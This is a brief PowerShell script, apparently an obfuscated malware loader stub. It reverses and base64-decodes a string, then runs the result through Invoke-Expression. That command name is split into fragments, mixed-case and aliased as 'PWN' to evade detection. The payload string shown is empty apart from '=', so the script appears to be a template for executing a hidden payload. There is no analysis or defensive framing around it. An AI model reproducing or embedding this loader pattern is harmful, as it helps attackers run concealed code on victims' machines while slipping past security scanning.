$best64code = "=" ;
$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null ;
$LOadCODE = [sYstEm.tExt.eNCodING]::uTF8.GEtstriNG([systeM.CoNvert]::fROMbaSe64sTriNg("$bAse64")) ;
$PWN = "iN"+"vO"+"KE"+"-E"+"Xp"+"Re"+"Ss"+"IO"+"N" ; nEW-alIAS -naMe PWN -ValUe $pwN -FoRce ; pWn $LOADCode ;
